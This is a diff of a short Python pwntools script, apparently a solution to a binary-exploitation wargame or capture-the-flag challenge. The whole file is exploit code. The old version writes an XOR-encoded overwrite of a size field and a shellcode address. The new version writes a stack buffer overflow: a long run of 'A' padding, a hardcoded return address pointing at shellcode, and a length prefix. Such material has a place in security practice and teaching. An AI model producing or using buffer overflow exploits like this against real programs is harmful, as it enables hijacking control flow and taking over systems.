@@ -1,21 +1,16 @@
 import sys
 from pwn import *
 
-def get_byte(num, pos):
-    return (num >> (pos * 8)) & 0xff
+junk_size = 65282+4
 
-shellcode_address = 0xffffd549
-size_to_override = 36
+shellcode_address = 0xffffd542
 
-payload = b''
+payload = b'A' * junk_size
+payload += p32(shellcode_address)
 
-for i in range(4):
-    # buffer[counter] = buffer[counter] ^ counter * '\x03';
-    ch = size_to_override + i
-    ch ^= i * 3
-    payload += p8(ch)
+if (len(payload) & 0xffff) > 0x003f:
+    payload += b'A' * (len(payload) & 0xffff - len(payload) + 0x10)
 
-    payload += p8(get_byte(shellcode_address, i))
+args = (str(len(payload))).encode() + b' ' + payload
 
-
-sys.stdout.buffer.write(payload)
+sys.stdout.buffer.write(args)
